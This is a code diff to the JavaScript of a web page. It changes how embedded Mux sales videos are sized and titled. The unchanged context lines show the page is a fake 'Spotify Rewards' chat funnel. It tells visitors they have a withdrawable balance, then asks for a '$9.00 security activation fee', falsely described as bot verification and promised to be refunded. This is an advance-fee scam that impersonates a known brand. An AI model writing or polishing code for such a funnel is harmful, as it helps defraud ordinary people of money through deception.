@@ -726,16 +726,16 @@
         return f;
       }
 
-      function videoBlock(src, height, ratio) {
+      function videoBlock(src, ratio, title) {
         var block = document.createElement('div');
         block.className = 'vsl-block';
         block.setAttribute('aria-label', 'Video');
-        if (ratio) block.style.aspectRatio = ratio;
-        else block.style.height = height + 'px';
+        block.style.aspectRatio = ratio;
         var playbackId = src.split('/').pop().replace(/\.m3u8(?:\?.*)?$/, '');
         var player = document.createElement('iframe');
-        player.src = 'https://player.mux.com/' + encodeURIComponent(playbackId);
-        player.title = 'Vídeo explicativo';
+        var encodedTitle = title.replace(/ /g, '+');
+        player.src = 'https://player.mux.com/' + encodeURIComponent(playbackId) + '?metadata-video-title=' + encodedTitle + '&video-title=' + encodedTitle;
+        player.title = title;
         player.setAttribute('frameborder', '0');
         player.setAttribute('allow', 'accelerometer; gyroscope; autoplay; encrypted-media; picture-in-picture;');
         player.setAttribute('allowfullscreen', '');
@@ -829,7 +829,7 @@
         await sleep(4000);
         await say('Hi, welcome to the Spotify Rewards!');
         await sleep(3000);
-        videoBlock('https://stream.mux.com/DNXBDFnxgzWm8YNg2RwKdlarSSwifz5J8pEoNZ00k02TY.m3u8', 620);
+        videoBlock('https://stream.mux.com/DNXBDFnxgzWm8YNg2RwKdlarSSwifz5J8pEoNZ00k02TY.m3u8', '9 / 16', 'Vsl English1');
         await say('You have a balance of ${{balance}} in our app');
         await sleep(3000);
         await say('Would you like to continue so you can withdraw your money?');
@@ -886,7 +886,7 @@
 
         // VSL + oferta
         await sayStatus('Your access to withdraw your commission will be granted after this short explanatory video', 'alert');
-        videoBlock('https://stream.mux.com/AwQwkbXYd6kbE2ayuvZv8RYZBXfi4xpzeN4JHoBf00zI.m3u8', 0, '16 / 9');
+        videoBlock('https://stream.mux.com/AwQwkbXYd6kbE2ayuvZv8RYZBXfi4xpzeN4JHoBf00zI.m3u8', '16 / 9', 'Vsl English2');
         await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
         await sleep(5000);
         await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
